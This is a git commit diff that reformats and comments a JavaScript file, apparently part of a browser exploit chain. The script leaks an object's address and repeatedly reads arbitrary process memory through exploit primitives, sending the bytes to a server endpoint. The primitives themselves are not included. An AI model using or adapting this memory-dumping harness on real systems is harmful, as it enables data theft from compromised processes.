0dfd2562ab2b4805fc9e8071884e87ffdefdace5
a0zhar <96749372+a0zhar@users.noreply.github.com>
2024-03-25 13:13:58 +0100

    Update server.js

--- memserver/server.js
+++ memserver/server.js
@@ -1,52 +1,44 @@
-function query()
-{
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', '/pull', true);
-    xhr.onerror = query.bind(window);
-    xhr.onload = function()
-    {
-        try
-        {
-            try
-            {
-                var data = JSON.parse(xhr.responseText);
-            }
-            catch(e)
-            {
-                return query();
-            }
-            if(data !== null)
-            {
-                var m = read_mem_b(data.offset, data.size);
-                var xhr2 = new XMLHttpRequest();
-                xhr2.open('POST', '/push', false);
-                xhr2.send(m);
-            }
-        }
-        catch(e)
-        {
-            document.body.innerHTML += e;
+// Function to query for data
+function query() {
+  // Variable to store response data
+  let data = null;
+  // Create a new XMLHttpRequest object
+  const xhr = new XMLHttpRequest();
+  // Open a POST request to "/pull" endpoint asynchronously
+  xhr.open("POST", "/pull", true);
+  // Handle errors by retrying the query
+  xhr.onerror = query.bind(window);
+  // When the request is loaded
+  xhr.onload = function () {
+      try {
+          try {
+              // Try parsing the response text as JSON
+              data = JSON.parse(xhr.responseText);
+          } catch (e) { return query(); }
+ 
+          if (data !== null) {
+            const xhr2 = new XMLHttpRequest();
+            xhr2.open("POST", "/push", false);
+            xhr2.send(read_mem_b(data.offset, data.size));
+          }
+        } catch (e) {
+          document.body.innerHTML += e;
         }
         query();
-    }
-    xhr.send('');
+  };
+  xhr.send("");
 }
 
-function leak(obj)
-{
-    var addr = addrof(obj);
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', '/leak', true);
-    xhr.send(hex(addr));
+// Function to leak object address
+function leak(obj) {
+  var addr = addrof(obj);
+  const xhr = new XMLHttpRequest();
+  xhr.open("POST", "/leak", true);
+  xhr.send(hex(addr));
 }
 
-try
-{
-    var tarea = document.createElement('textarea');
-    leak(tarea);
-    query();
-}
-catch(e)
-{
-    alert(e);
-}
+try {
+  var tarea = document.createElement("textarea");
+  leak(tarea);
+  query();
+} catch (e) { alert(e); }
